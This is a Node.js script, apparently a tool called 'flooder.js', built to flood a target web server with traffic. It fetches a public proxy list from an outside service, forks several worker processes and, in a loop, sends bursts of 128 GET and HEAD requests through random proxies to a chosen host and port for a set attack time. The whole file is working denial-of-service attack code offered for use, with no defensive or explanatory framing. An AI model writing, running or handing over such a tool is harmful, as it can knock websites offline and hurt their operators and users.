const net = require('net');
const url = require('url');
const cluster = require('cluster');
const fetch = require('node-fetch');
const process = require('process');

async function fetchProxies() {
    try {
        const response = await fetch('https://www.proxy-list.download/api/v1/get?type=https');
        if (!response.ok) throw new Error('Network response was not ok.');
        const data = await response.text();
        return data.split('\r\n').filter(proxy => proxy);
    } catch (error) {
        console.error('Error fetching proxies:', error);
        return [];
    }
}

(async () => {
    if (process.argv.length < 6) {
        console.log('Usage:');
        console.log('  node flooder.js <target-host> <target-port> <attack-duration> <number-of-processes>');
        console.log('Example:');
        console.log('  node flooder.js example.com 80 60 4');
        process.exit(1);
    }

    const [,, targetHost, targetPort, attackDuration, numberOfProcesses] = process.argv;
    const proxies = await fetchProxies();
    if (proxies.length === 0) {
        console.error('No proxies fetched. Exiting.');
        process.exit(1);
    }

    const tarPOST = `http://${targetHost}:${targetPort}`;
    const parsed = url.parse(tarPOST);

    if (cluster.isMaster) {
        for (let i = 0; i < numberOfProcesses; i++) {
            cluster.fork();
        }
        setTimeout(() => {
            process.exit(1);
        }, attackDuration * 1000);
    }

    setInterval(() => {
        const proxy = proxies[Math.floor(Math.random() * proxies.length)];
        const [host, port] = proxy.split(':');

        console.log(`Using Proxy: ${proxy} To Attack`);

        const socket = net.connect(port, host);
        socket.setKeepAlive(false, 0);
        socket.setTimeout(5000);

        for (let j = 0; j < 128; j++) {
            socket.write(`GET ${tarPOST} HTTP/1.1\r\nHost: ${parsed.host}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: \r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: zh-HK,zh;q=0.9,en;q=0.8,zh-CN;q=0.7,en-US;q=0.6\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\n\r\n`);
            socket.write(`HEAD ${tarPOST} HTTP/1.1\r\nHost: ${parsed.host}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: \r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: zh-HK,zh;q=0.9,en;q=0.8,zh-CN;q=0.7,en-US;q=0.6\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\n\r\n`);
        }
        socket.on('data', () => {
            setTimeout(() => {
                socket.destroy();
                return delete socket;
            }, 5000);
        });
    });
})();
